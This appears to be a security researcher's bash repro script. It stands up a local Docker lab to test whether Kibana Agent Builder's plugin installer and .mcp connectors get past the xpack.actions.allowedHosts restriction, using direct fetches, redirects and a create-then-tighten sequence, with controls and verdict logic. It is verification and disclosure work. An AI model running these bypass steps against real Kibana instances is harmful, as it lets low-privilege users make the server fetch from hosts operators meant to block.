#!/usr/bin/env bash
# Elastic Agent Builder allowedHosts-bypass repro.
#
# Defender assumption under test: "Every server-side fetch Kibana makes on a
# user's behalf is bounded by the operator's xpack.actions.allowedHosts."
# The actions/connectors path honours it (CONTROL A/B). The Agent Builder
# plugin-from-URL installer allegedly does not (TEST 1 direct, TEST 2 via
# redirect from an allowed host).
#
# Run #4 adds TEST 3 (elastic-hunt-2 survivor S-1): the .mcp connector
# validates serverUrl against allowedHosts ONLY at creation time (and on
# redirect hops) - never at execution time for the initial URL
# (build_custom_fetch.ts: the initial fetch carries no ensureUriAllowed;
# only redirect hops are checked). So Kibana boots TWICE: phase A with the
# canary LISTED (create the .mcp connector + a .webhook drift twin under
# the permissive list), then a restart with the restrictive run #3 list
# (phase B), after which every run #3 control/test re-runs unchanged, plus:
#   TEST 3     execute the pre-created .mcp connector's listTools - if the
#              initial URL were re-validated, the fetch could never arrive
#   CONTROL D  execute the .webhook twin - must be REFUSED at execution
#              time (the axios family re-validates per request)
#   CONTROL E  create a NEW .mcp connector under the restrictive list -
#              must be REFUSED by the creation-time validator
# SUMMARY.txt therefore carries a SECOND verdict line for S-1:
#   VERDICT-S1: CONFIRMED / KILLED / INCONCLUSIVE
# (the workflow's green gate keys on the main "VERDICT: CONFIRMED" line
# only, exactly as in run #3).
#
# Everything is captured into evidence/<timestamp>/. The script does not
# abort on individual failures; SUMMARY.txt at the end carries the verdict:
#   CONFIRMED / KILLED / INCONCLUSIVE with per-check PASS/FAIL lines.
#
# Usage:  ./run-test.sh            (brings the stack up, runs all checks)
#         docker compose down -v   (teardown afterwards)
set -u
cd "$(dirname "$0")"

set -a; [ -f .env ] && . ./.env; set +a
ES=http://localhost:9200
KB=http://localhost:5601
SPACE=canary-space
ROLE=ab_agentbuilder_only
MCP_ROLE=ab_mcp_user
MCP_USER=mcp_tester
MCP_PASSWORD="${MCP_PASSWORD:-mcp-tester-lab-password-1}"
ALLOWED_PHASE_A='["example.com","redirector","canary"]'
ALLOWED_PHASE_B='["example.com","redirector"]'
EV="evidence/$(date +%Y%m%d-%H%M%S)"
mkdir -p "$EV"
SUMMARY="$EV/SUMMARY.txt"
: > "$SUMMARY"

note() { echo "$*" | tee -a "$SUMMARY"; }
pass() { note "PASS  $*"; }
fail() { note "FAIL  $*"; }

# req <outfile> <method> <url> [curl args...] -> echoes http code
req() {
  local out="$1" method="$2" url="$3"; shift 3
  curl -s -o "$out" -w "%{http_code}" -X "$method" "$url" "$@"
}
jsonget() { python3 -c "import json,sys; d=json.load(open('$1')); print($2)" 2>/dev/null; }

echo "== generating plugin zips =="
python3 gen_plugin_zips.py | tee "$EV/00-zipgen.txt"

echo "== starting ES + canary + redirector =="
docker compose up -d es canary redirector | tee "$EV/00-compose-up.txt"
docker compose images > "$EV/00-images.txt" 2>&1

echo "== waiting for Elasticsearch =="
for i in $(seq 1 60); do
  code=$(req "$EV/00-es-root.json" GET "$ES/" -u "elastic:$ELASTIC_PASSWORD")
  [ "$code" = "200" ] && break
  sleep 5
done
note "ES root http=$code  version=$(jsonget "$EV/00-es-root.json" "d['version']['number']")"

echo "== setting kibana_system password, starting Kibana =="
req "$EV/00-kibana-system-pw.json" POST \
  "$ES/_security/user/kibana_system/_password" \
  -u "elastic:$ELASTIC_PASSWORD" -H "Content-Type: application/json" \
  -d "{\"password\":\"$KIBANA_SYSTEM_PASSWORD\"}" >/dev/null
# Run #4 phase A: boot Kibana with the canary LISTED in allowedHosts (TEST 3
# connector creation must pass the creation-time validator). A generated
# override file carries the phase A value so docker-compose.yml itself -
# the run #3 configuration - stays untouched; phase B restarts Kibana from
# the base file alone, which recreates the container with ALLOWED_PHASE_B.
cat > docker-compose.phaseA.yml <<'YAML'
services:
  kibana:
    environment:
      - XPACK_ACTIONS_ALLOWEDHOSTS=["example.com","redirector","canary"]
YAML
docker compose -f docker-compose.yml -f docker-compose.phaseA.yml up -d kibana >> "$EV/00-compose-up.txt" 2>&1
note "run#4 phase A: Kibana booting with xpack.actions.allowedHosts=$ALLOWED_PHASE_A (canary LISTED)"

# wait_kibana_ready <status-outfile>: poll /api/status until Kibana reports
# available; hard SETUP-FAILED exit otherwise. Called for the initial boot
# (evidence 00-kb-status.json, as in runs #1-#3) and again after the run #4
# phase-B Kibana restart (evidence 17-kb-status-phaseb.json).
wait_kibana_ready() {
  local out="$1" i
  kready=0
  for i in $(seq 1 60); do
    req "$out" GET "$KB/api/status" -u "elastic:$ELASTIC_PASSWORD" >/dev/null
    if python3 - "$out" <<'PY'
import json,sys
try:
    d=json.load(open(sys.argv[1]))
    # 9.5.5 /api/status shape: status.overall.level is the STRING "available"
    # (run #1's check looked for overall.id / overall.state, which do not
    # exist, so it reported ready=0 against a fully available Kibana).
    ov=(d.get("status",{}) or {}).get("overall",{}) or {}
    ok = ov.get("level")=="available" or ov.get("state")=="green"
    sys.exit(0 if ok else 1)
except Exception:
    sys.exit(1)
PY
    then kready=1; break; fi
    sleep 10
  done
  note "Kibana ready=$kready"
  if [ "$kready" = "0" ]; then
    note "VERDICT: SETUP-FAILED - Kibana /api/status never reported available (see $(basename "$out")); tests not run"
    note "Evidence dir: $EV"
    exit 1
  fi
}

echo "== waiting for Kibana =="
wait_kibana_ready "$EV/00-kb-status.json"

echo "== trial licence =="
code=$(req "$EV/01-licence.json" POST "$ES/_license/start_trial?acknowledge=true" -u "elastic:$ELASTIC_PASSWORD")
note "start_trial http=$code (400 with 'already' text is fine if a trial/full licence is active)"

echo "== space / role / user =="
code=$(req "$EV/02-space.json" POST "$KB/api/spaces/space" -u "elastic:$ELASTIC_PASSWORD" \
  -H "kbn-xsrf: true" -H "Content-Type: application/json" \
  -d "{\"id\":\"$SPACE\",\"name\":\"$SPACE\"}")
note "create space http=$code"
code=$(req "$EV/02-role.json" PUT "$KB/api/security/role/$ROLE" -u "elastic:$ELASTIC_PASSWORD" \
  -H "kbn-xsrf: true" -H "Content-Type: application/json" \
  -d "{\"elasticsearch\":{\"cluster\":[],\"indices\":[],\"run_as\":[]},\"kibana\":[{\"base\":[],\"feature\":{\"agentBuilder\":[\"all\"]},\"spaces\":[\"$SPACE\"]}]}")
note "create role (agentBuilder all, space-scoped, NO actions/cluster privileges) http=$code"
code=$(req "$EV/02-user.json" PUT "$ES/_security/user/$AB_USER" -u "elastic:$ELASTIC_PASSWORD" \
  -H "Content-Type: application/json" \
  -d "{\"password\":\"$AB_PASSWORD\",\"roles\":[\"$ROLE\"],\"full_name\":\"AB Tester\",\"email\":\"ab@example.test\",\"enabled\":true}")
note "create low-priv user http=$code"

echo "== TEST 3 setup: role $MCP_ROLE (agentBuilder all + actions all in $SPACE, NO ES privileges) + user $MCP_USER =="
code=$(req "$EV/02b-mcp-role.json" PUT "$KB/api/security/role/$MCP_ROLE" -u "elastic:$ELASTIC_PASSWORD" \
  -H "kbn-xsrf: true" -H "Content-Type: application/json" \
  -d "{\"elasticsearch\":{\"cluster\":[],\"indices\":[],\"run_as\":[]},\"kibana\":[{\"base\":[],\"feature\":{\"agentBuilder\":[\"all\"],\"actions\":[\"all\"]},\"spaces\":[\"$SPACE\"]}]}")
note "create mcp role (agentBuilder all + actions all, space-scoped, NO ES privileges) http=$code"
code=$(req "$EV/02c-mcp-user.json" PUT "$ES/_security/user/$MCP_USER" -u "elastic:$ELASTIC_PASSWORD" \
  -H "Content-Type: application/json" \
  -d "{\"password\":\"$MCP_PASSWORD\",\"roles\":[\"$MCP_ROLE\"],\"full_name\":\"MCP Tester\",\"email\":\"mcp@example.test\",\"enabled\":true}")
note "create mcp_tester user http=$code"

echo "== enabling agentBuilder:experimentalFeatures in the test space =="
# Run #1/#2 lesson, corrected by the 9.5.5 source (elastic-run3-diagnosis.md):
# POST /api/kibana/settings EXISTS and writes exactly the right store (the
# per-space config saved object, via the space uiSettings client) - but in
# 9.5.5 it is a core INTERNAL route. Kibana's restrictInternalApis check
# (default ON) rejects non-internal callers with 400 "uri [...] exists but
# is not available with the current configuration" - the 400 seen in both
# spaces in runs #1/#2. A request counts as internal when it carries the
# header "x-elastic-internal-origin: Kibana" (what Kibana's own browser
# client sends). So: send that header. The raw config-SO write below stays
# as a fallback, with run #2's bug fixed: at 9.5.5 the saved-objects create
# body schema has NO "id" field (unknown keys are rejected -> the space
# 400); the id goes in the PATH (POST /api/saved_objects/config/<id>).
# Either way, VERIFY the flag in the space config object before any test.
set_flag_so() { # $1=base-url $2=outfile-prefix -> echoes final http code
  local base="$1" pre="$2" code
  code=$(req "$pre-get.json" GET "$base/api/saved_objects/config/$KBVER" -u "elastic:$ELASTIC_PASSWORD" -H "kbn-xsrf: true")
  if [ "$code" = "200" ]; then
    code=$(req "$pre-put.json" PUT "$base/api/saved_objects/config/$KBVER" -u "elastic:$ELASTIC_PASSWORD" \
      -H "kbn-xsrf: true" -H "Content-Type: application/json" \
      -d '{"attributes":{"agentBuilder:experimentalFeatures":true}}')
  else
    code=$(req "$pre-post.json" POST "$base/api/saved_objects/config/$KBVER" -u "elastic:$ELASTIC_PASSWORD" \
      -H "kbn-xsrf: true" -H "Content-Type: application/json" \
      -d '{"attributes":{"agentBuilder:experimentalFeatures":true}}')
    if [ "$code" = "409" ]; then
      code=$(req "$pre-put.json" PUT "$base/api/saved_objects/config/$KBVER" -u "elastic:$ELASTIC_PASSWORD" \
        -H "kbn-xsrf: true" -H "Content-Type: application/json" \
        -d '{"attributes":{"agentBuilder:experimentalFeatures":true}}')
    fi
  fi
  echo "$code"
}
# apply_flag <status-outfile> <evidence-prefix>: apply
# agentBuilder:experimentalFeatures to the test space and VERIFY it landed
# in the space config saved object; hard SETUP-FAILED exit otherwise (the
# run #3 gate - nothing here is softened). Prefix "03" = initial application
# (run #3 evidence names), "17" = re-application after the run #4 phase-B
# Kibana restart (the saved object survives the restart, but the spec
# re-applies and re-verifies rather than assuming).
apply_flag() {
  local statusf="$1" pre="$2"
  local code_sd code_ss code_so_d code_so_s code_v
  KBVER=$(jsonget "$statusf" "d['version']['number']")
  code_sd=$(req "$EV/$pre-settings-default.json" POST "$KB/api/kibana/settings" -u "elastic:$ELASTIC_PASSWORD" \
    -H "kbn-xsrf: true" -H "x-elastic-internal-origin: Kibana" -H "Content-Type: application/json" \
    -d '{"changes":{"agentBuilder:experimentalFeatures":true}}')
  code_ss=$(req "$EV/$pre-settings-space.json" POST "$KB/s/$SPACE/api/kibana/settings" -u "elastic:$ELASTIC_PASSWORD" \
    -H "kbn-xsrf: true" -H "x-elastic-internal-origin: Kibana" -H "Content-Type: application/json" \
    -d '{"changes":{"agentBuilder:experimentalFeatures":true}}')
  note "settings POST default http=$code_sd space http=$code_ss (see $pre-settings-*.json)"
  code_so_d=$(set_flag_so "$KB" "$EV/${pre}b-so-default")
  code_so_s=$(set_flag_so "$KB/s/$SPACE" "$EV/${pre}b-so-space")
  note "config-SO write default http=$code_so_d space http=$code_so_s (see ${pre}b-so-*.json)"
  code_v=$(req "$EV/${pre}c-flag-verify.json" GET "$KB/s/$SPACE/api/saved_objects/config/$KBVER" -u "elastic:$ELASTIC_PASSWORD" -H "kbn-xsrf: true")
  if grep -q '"agentBuilder:experimentalFeatures":true' "$EV/${pre}c-flag-verify.json" 2>/dev/null; then
    note "flag verified in space config saved object (GET http=$code_v)"
  else
    note "flag NOT verified in space config saved object (GET http=$code_v; inspect ${pre}c-flag-verify.json)"
    note "VERDICT: SETUP-FAILED - agentBuilder:experimentalFeatures could not be applied/verified; install tests would run against an unflagged stack"
    note "Evidence dir: $EV"
    exit 1
  fi
}
apply_flag "$EV/00-kb-status.json" "03"

mk_connector() { # $1=name $2=url $3=outfile -> echoes connector id or empty
  local code id
  code=$(req "$3" POST "$KB/api/actions/connectors" -u "elastic:$ELASTIC_PASSWORD" \
    -H "kbn-xsrf: true" -H "Content-Type: application/json" \
    -d "{\"name\":\"$1\",\"connector_type_id\":\".webhook\",\"config\":{\"url\":\"$2\",\"method\":\"post\",\"hasAuth\":false},\"secrets\":{}}")
  id=$(jsonget "$3" "d.get('id','')")
  if [ -z "$id" ]; then
    code=$(req "$3" POST "$KB/api/actions/connector" -u "elastic:$ELASTIC_PASSWORD" \
      -H "kbn-xsrf: true" -H "Content-Type: application/json" \
      -d "{\"name\":\"$1\",\"connector_type_id\":\".webhook\",\"config\":{\"url\":\"$2\",\"method\":\"post\",\"hasAuth\":false},\"secrets\":{}}")
    id=$(jsonget "$3" "d.get('id','')")
  fi
  echo "$id"
}
exec_connector() { # $1=id $2=outfile -> echoes http code
  req "$2" POST "$KB/api/actions/connector/$1/_execute" -u "elastic:$ELASTIC_PASSWORD" \
    -H "kbn-xsrf: true" -H "Content-Type: application/json" \
    -d '{"params":{"body":"{\"ping\":true}"}}'
}
mk_connector_at() { # $1=base $2=name $3=type $4=config-json $5=outfile -> echoes connector id or empty
  local code id
  code=$(req "$5" POST "$1/api/actions/connectors" -u "elastic:$ELASTIC_PASSWORD" \
    -H "kbn-xsrf: true" -H "Content-Type: application/json" \
    -d "{\"name\":\"$2\",\"connector_type_id\":\"$3\",\"config\":$4,\"secrets\":{}}")
  id=$(jsonget "$5" "d.get('id','')")
  if [ -z "$id" ]; then
    code=$(req "$5" POST "$1/api/actions/connector" -u "elastic:$ELASTIC_PASSWORD" \
      -H "kbn-xsrf: true" -H "Content-Type: application/json" \
      -d "{\"name\":\"$2\",\"connector_type_id\":\"$3\",\"config\":$4,\"secrets\":{}}")
    id=$(jsonget "$5" "d.get('id','')")
  fi
  echo "$id"
}
exec_connector_as() { # $1=base $2=user:pass $3=id $4=params-json $5=outfile -> echoes http code
  req "$5" POST "$1/api/actions/connector/$3/_execute" -u "$2" \
    -H "kbn-xsrf: true" -H "Content-Type: application/json" \
    -d "{\"params\":$4}"
}

echo "== TEST 3 phase A: create .mcp (mcp-canary) + .webhook (hook-drift) in $SPACE while canary is LISTED =="
mcpid=$(mk_connector_at "$KB/s/$SPACE" "mcp-canary" ".mcp" '{"serverUrl":"http://canary:8080/mcp","hasAuth":false}' "$EV/03e-t3-mcp-create.json")
note "phaseA .mcp create id=$mcpid (empty = creation FAILED under the permissive list; see 03e-t3-mcp-create.json)"
driftid=$(mk_connector_at "$KB/s/$SPACE" "hook-drift" ".webhook" '{"url":"http://canary:8080/hook","method":"post","hasAuth":false}' "$EV/03f-t3-drift-create.json")
note "phaseA .webhook drift create id=$driftid (empty = creation FAILED under the permissive list; see 03f-t3-drift-create.json)"

echo "== TEST 3 phase B: restart Kibana with the restrictive list (canary UNLISTED); re-apply + re-verify flag =="
docker compose up -d kibana >> "$EV/00-compose-up.txt" 2>&1
rm -f docker-compose.phaseA.yml
note "run#4 phase B: Kibana restarting with xpack.actions.allowedHosts=$ALLOWED_PHASE_B (canary UNLISTED; base compose config, override removed)"
wait_kibana_ready "$EV/17-kb-status-phaseb.json"
apply_flag "$EV/17-kb-status-phaseb.json" "17"

echo "== CONTROL A: webhook connector -> canary directly (must be REFUSED by allowedHosts) =="
cid=$(mk_connector "hook-direct" "http://canary:8080/hook" "$EV/04-controlA-create.json")
if [ -n "$cid" ]; then
  code=$(exec_connector "$cid" "$EV/05-controlA-execute.json")
  note "controlA execute http=$code"
else
  note "controlA connector create itself failed (see 04) - refusal may already be the control evidence"
fi

echo "== CONTROL B: webhook connector -> redirector (allowed) -302-> canary (must be REFUSED at redirect hop) =="
cid=$(mk_connector "hook-redirect" "http://redirector:8080/hook" "$EV/06-controlB-create.json")
if [ -n "$cid" ]; then
  code=$(exec_connector "$cid" "$EV/07-controlB-execute.json")
  note "controlB execute http=$code"
fi

echo "== CONTROL C: low-priv user tries to create a connector (informational: persona has no actions privilege) =="
code=$(req "$EV/08-controlC-lowpriv-connector.json" POST "$KB/api/actions/connectors" -u "$AB_USER:$AB_PASSWORD" \
  -H "kbn-xsrf: true" -H "Content-Type: application/json" \
  -d '{"name":"nope","connector_type_id":".webhook","config":{"url":"http://canary:8080/hook","method":"post","hasAuth":false},"secrets":{}}')
note "controlC low-priv connector create http=$code (403/404 expected)"

install() { # $1=url $2=outfile -> echoes http code
  req "$2" POST "$KB/s/$SPACE/api/agent_builder/plugins/install" -u "$AB_USER:$AB_PASSWORD" \
    -H "kbn-xsrf: true" -H "Content-Type: application/json" -H "elastic-api-version: 2023-10-31" \
    -d "{\"url\":\"$1\"}"
}
list_plugins() { # $1=outfile -> echoes http code
  req "$1" GET "$KB/s/$SPACE/api/agent_builder/plugins" -u "$AB_USER:$AB_PASSWORD" \
    -H "elastic-api-version: 2023-10-31"
}

echo "== DISCRIMINATOR: superuser plugin routes in the DEFAULT space (route-existence check) =="
code_dl=$(req "$EV/03d-disc-list.json" GET "$KB/api/agent_builder/plugins" -u "elastic:$ELASTIC_PASSWORD" \
  -H "elastic-api-version: 2023-10-31")
note "discriminator superuser list (default space) http=$code_dl"
code_di=$(req "$EV/03d-disc-install.json" POST "$KB/api/agent_builder/plugins/install" -u "elastic:$ELASTIC_PASSWORD" \
  -H "kbn-xsrf: true" -H "Content-Type: application/json" -H "elastic-api-version: 2023-10-31" \
  -d '{"url":"http://canary:8080/z.zip"}')
note "discriminator superuser install (default space, third canary plugin) http=$code_di (200/meaningful error = route registered; 404 = route not registered)"

echo "== TEST 1: low-priv plugin install from UNLISTED canary URL =="
code1=$(install "http://canary:8080/x.zip" "$EV/09-test1-install.json")
note "test1 install http=$code1"
code1l=$(list_plugins "$EV/10-test1-list.json")
note "test1 list http=$code1l"

echo "== TEST 2: low-priv plugin install via ALLOWED redirector -302-> canary =="
code2=$(install "http://redirector:8080/jump.zip" "$EV/11-test2-install.json")
note "test2 install http=$code2"
code2l=$(list_plugins "$EV/12-test2-list.json")
note "test2 list http=$code2l"
note "test1 install body: $(head -c 400 "$EV/09-test1-install.json")"
note "test2 install body: $(head -c 400 "$EV/11-test2-install.json")"

echo "== snapshot: canary log BEFORE TEST 3 execution (arrival baseline) =="
# TEST 3's discriminator is a NEW POST /mcp arrival after this snapshot, so
# even a hypothetical creation-time fetch in phase A cannot fake the pass.
docker compose logs --no-color canary > "$EV/12a-canary-pre-t3.log" 2>&1
mcp_pre=$(grep -c "POST /mcp" "$EV/12a-canary-pre-t3.log" 2>/dev/null); mcp_pre=${mcp_pre:-0}
note "canary POST /mcp count before TEST 3: $mcp_pre"

echo "== TEST 3: $MCP_USER executes mcp-canary listTools under the RESTRICTIVE list (S-1 discriminator) =="
if [ -n "$mcpid" ]; then
  code_t3=$(exec_connector_as "$KB/s/$SPACE" "$MCP_USER:$MCP_PASSWORD" "$mcpid" '{"subAction":"listTools","subActionParams":{}}' "$EV/12b-test3-execute.json")
  note "test3 execute http=$code_t3"
  note "test3 execute body: $(head -c 400 "$EV/12b-test3-execute.json")"
else
  code_t3="000"
  echo '{"error":"phase A .mcp creation failed - TEST 3 not executed"}' > "$EV/12b-test3-execute.json"
  note "test3 SKIPPED - phase A .mcp creation failed (see 03e-t3-mcp-create.json)"
fi

echo "== CONTROL D: $MCP_USER executes hook-drift (same create-then-tighten lifecycle; must be REFUSED at execution) =="
if [ -n "$driftid" ]; then
  code_cd=$(exec_connector_as "$KB/s/$SPACE" "$MCP_USER:$MCP_PASSWORD" "$driftid" '{"body":"{\"ping\":true}"}' "$EV/12c-controld-execute.json")
  note "controlD execute http=$code_cd"
  note "controlD execute body: $(head -c 400 "$EV/12c-controld-execute.json")"
else
  code_cd="000"
  echo '{"error":"phase A drift creation failed - CONTROL D not executed"}' > "$EV/12c-controld-execute.json"
  note "controlD SKIPPED - phase A .webhook creation failed (see 03f-t3-drift-create.json)"
fi

echo "== CONTROL E: superuser tries to CREATE a second .mcp connector under the RESTRICTIVE list (must be REFUSED) =="
code_ce=$(req "$EV/12d-controle-create.json" POST "$KB/s/$SPACE/api/actions/connectors" -u "elastic:$ELASTIC_PASSWORD" \
  -H "kbn-xsrf: true" -H "Content-Type: application/json" \
  -d '{"name":"mcp-canary-2","connector_type_id":".mcp","config":{"serverUrl":"http://canary:8080/mcp","hasAuth":false},"secrets":{}}')
eid=$(jsonget "$EV/12d-controle-create.json" "d.get('id','')")
note "controlE create http=$code_ce id='$eid' (refusal with allowlist error expected; see 12d-controle-create.json)"

echo "== collecting service logs =="
docker compose logs --no-color canary     > "$EV/13-canary.log" 2>&1
docker compose logs --no-color redirector > "$EV/14-redirector.log" 2>&1
docker compose logs --no-color kibana     > "$EV/15-kibana.log" 2>&1
docker compose ps > "$EV/16-ps.txt" 2>&1

echo "== assertions =="
# Control evidence: refusal language in A-create or A-execute, and no /hook ever reached the canary.
if grep -qi "allowed" "$EV/04-controlA-create.json" "$EV/05-controlA-execute.json" 2>/dev/null; then
  pass "CONTROL A refused with allowedHosts language"
else
  fail "CONTROL A no allowedHosts refusal found in create/execute responses (inspect 04/05)"
fi
if grep -q "/hook" "$EV/13-canary.log"; then
  fail "canary received a /hook request - a connector call got through"
else
  pass "canary never received /hook (connector path fully blocked, direct + redirect)"
fi
# Test 1
if [ "$code1" = "200" ] && grep -q "ssrf-canary-a" "$EV/09-test1-install.json" && grep -q "GET /x.zip" "$EV/13-canary.log"; then
  pass "TEST 1 install from unlisted canary succeeded; canary logged Kibana's GET /x.zip"
else
  fail "TEST 1 did not fully succeed (http=$code1; inspect 09/13)"
fi
grep -q "ssrf-canary-a" "$EV/10-test1-list.json" \
  && pass "TEST 1 plugin ssrf-canary-a persisted (visible in plugin list)" \
  || fail "TEST 1 plugin not in list (inspect 10)"
# Test 2
if [ "$code2" = "200" ] && grep -q "ssrf-canary-b" "$EV/11-test2-install.json" \
   && grep -q "GET /jump.zip" "$EV/14-redirector.log" && grep -q "GET /y.zip" "$EV/13-canary.log"; then
  pass "TEST 2 install via allowed-host redirect succeeded; redirector + canary logs confirm the chain"
else
  fail "TEST 2 did not fully succeed (http=$code2; inspect 11/13/14)"
fi
# TEST 3 (S-1): a NEW POST /mcp arrival after the pre-execution snapshot,
# with no allowedHosts refusal in the execute response, proves the initial
# URL was never re-validated after the list was tightened.
mcp_post=$(grep -c "POST /mcp" "$EV/13-canary.log" 2>/dev/null); mcp_post=${mcp_post:-0}
note "canary POST /mcp count after TEST 3: $mcp_post (before: $mcp_pre)"
if [ "$mcp_post" -gt "$mcp_pre" ] && ! grep -qi "allowed" "$EV/12b-test3-execute.json" 2>/dev/null; then
  pass "TEST 3 .mcp execution reached the UNLISTED canary after tightening (new POST /mcp in canary log; no execution-time re-validation)"
else
  fail "TEST 3 .mcp execution did not reach the canary (http=$code_t3; inspect 12b/12a/13)"
fi
if grep -q "canary_echo" "$EV/12b-test3-execute.json" 2>/dev/null; then
  pass "TEST 3 listTools returned the canary stub's tool list (full initialize + tools/list round trip)"
else
  note "note: TEST 3 execute body carries no stub tool list (the canary-log arrival above is the discriminator; inspect 12b)"
fi
# CONTROL D: the .webhook twin, created under the same permissive list,
# must be refused AT EXECUTION under the tightened list (and the generic
# "canary never received /hook" assertion above backstops the no-arrival
# half for this control too).
if grep -qi "allowed" "$EV/12c-controld-execute.json" 2>/dev/null; then
  pass "CONTROL D hook-drift refused at execution time with allowedHosts language (create-then-tighten binds the axios family)"
else
  fail "CONTROL D hook-drift was NOT refused with allowedHosts language (http=$code_cd; inspect 12c)"
fi
# CONTROL E: creating a NEW .mcp connector under the tightened list must
# still be refused by the creation-time validator - the gap is
# execution-time-only.
if [ -z "$eid" ] && grep -qi "allowed" "$EV/12d-controle-create.json" 2>/dev/null; then
  pass "CONTROL E .mcp creation under the restrictive list refused with allowlist language (gap is execution-time-only)"
else
  fail "CONTROL E .mcp creation was not refused as expected (http=$code_ce id='$eid'; inspect 12d)"
fi

echo "== verdict =="
if grep -qi "allowed" "$EV/09-test1-install.json" "$EV/11-test2-install.json" 2>/dev/null; then
  note "VERDICT: KILLED - the GA installer refused with allowedHosts language; the guard exists on this build."
elif grep -q "^PASS  TEST 1" "$SUMMARY" && grep -q "^PASS  TEST 2" "$SUMMARY" && grep -q "^PASS  CONTROL A" "$SUMMARY"; then
  note "VERDICT: CONFIRMED - configured allowlist binds the connector path (incl. redirect hops) but not the Agent Builder installer, for a non-superuser persona."
else
  note "VERDICT: INCONCLUSIVE - inspect the evidence files; common causes: install route 404 (feature flag/licence), settings not applied in space, stack not fully up."
fi
if grep -q "^PASS  TEST 3" "$SUMMARY" && grep -q "^PASS  CONTROL D" "$SUMMARY" && grep -q "^PASS  CONTROL E" "$SUMMARY"; then
  note "VERDICT-S1: CONFIRMED - an .mcp connector created while its host was allowed keeps executing against that host after xpack.actions.allowedHosts is tightened (no execution-time re-validation of the initial URL); the same create-then-tighten lifecycle binds the axios/webhook family (CONTROL D) and creation stays guarded (CONTROL E)."
elif grep -qi "allowed" "$EV/12b-test3-execute.json" 2>/dev/null; then
  note "VERDICT-S1: KILLED - .mcp execution was refused with allowedHosts language after tightening; the initial URL is re-validated at execution time on this build."
else
  note "VERDICT-S1: INCONCLUSIVE - TEST 3 / CONTROL D / CONTROL E did not all resolve as specified (inspect 12b/12c/12d + 12a/13 canary logs)."
fi
note "Evidence dir: $EV"
echo "Done. Teardown with: docker compose down -v"
